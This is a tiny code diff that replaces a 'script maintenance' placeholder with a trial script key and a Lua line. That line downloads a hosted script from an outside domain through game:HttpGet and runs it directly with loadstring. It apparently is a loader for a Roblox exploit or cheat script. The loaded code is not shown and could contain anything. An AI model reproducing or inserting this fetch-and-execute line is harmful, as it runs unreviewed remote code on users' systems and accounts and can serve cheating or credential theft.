@@ -1,1 +1,3 @@
-print("script mantenice")
+script_key = "trial"
+
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/3af692e60ec84cb1147549818f06d20acead449b1d9ae7ccc255af6e54b4091e.lua"))()
